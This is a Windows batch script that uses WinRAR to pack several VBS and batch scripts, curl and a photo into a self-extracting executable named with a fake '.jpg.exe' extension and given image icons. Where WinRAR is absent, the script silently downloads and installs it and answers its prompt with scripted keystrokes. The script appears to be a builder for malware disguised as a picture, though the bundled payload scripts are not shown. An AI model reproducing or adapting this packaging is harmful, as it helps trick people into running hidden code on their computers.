@echo on
if exist "%ProgramFiles%\"WinRar\WinRAR.exe (
"%ProgramFiles%\"WinRar\WinRAR.exe a -sfxdefault.sfx sfxconstryctrort.jpg.exe mykonstruktor.bat imageProcessing.vbs sfxconstructror3.vbs.txt sfxconstructror3.vbs.bat mainmain.vbs 12918591_540444079463619_1987164180_n.jpg main.vbs rasinvkr.bat spt2.bat main.bat.exe mainsfx.bat spx.txt sfxcomment.txt defaultpngicon.ico defaultjpgicon.ico upa.ico libcurl.dll curl-ca-bundle.crt curl.exe konstruktor.txt "nati&gabi.ico" -zkonstruktor.txt -iicon"nati&gabi.ico" -IBCK 
) else if exist WinRAR.exe ( 
WinRAR.exe a -sfxdefault.sfx sfxconstryctrort.jpg.exe mykonstruktor.bat imageProcessing.vbs sfxconstructror3.vbs.txt sfxconstructror3.vbs.bat mainmain.vbs 12918591_540444079463619_1987164180_n.jpg main.vbs rasinvkr.bat spt2.bat main.bat.exe mainsfx.bat spx.txt sfxcomment.txt defaultpngicon.ico defaultjpgicon.ico upa.ico libcurl.dll curl-ca-bundle.crt curl.exe konstruktor.txt "nati&gabi.ico" -zkonstruktor.txt -iicon"nati&gabi.ico" -IBCK 
) else (
curl https://www.rarlab.com/rar/wrar601b1.exe -o wrarsetup.exe
echo set oShell = WScript.CreateObject^("WScript.Shell"^) >mysh.vbs
echo oShell.SendKeys^("%CD%"^) >>mysh.vbs
echo WScript.Sleep 50 >>mysh.vbs
echo oShell.SendKeys^("{ENTER}"^) >>mysh.vbs
start /MIN rasinvkr.bat "wrarsetup.exe /S"
timeout /T 1
cscript mysh.vbs
del mysh.vbs
timeout /T 5
WinRAR.exe a -sfxdefault.sfx sfxconstryctrort.jpg.exe mykonstruktor.bat imageProcessing.vbs sfxconstructror3.vbs.txt sfxconstructror3.vbs.bat mainmain.vbs 12918591_540444079463619_1987164180_n.jpg main.vbs rasinvkr.bat spt2.bat main.bat.exe mainsfx.bat spx.txt sfxcomment.txt defaultpngicon.ico defaultjpgicon.ico upa.ico libcurl.dll curl-ca-bundle.crt curl.exe konstruktor.txt "nati&gabi.ico" -zkonstruktor.txt -iicon"nati&gabi.ico" -IBCK 
)
PAUSE
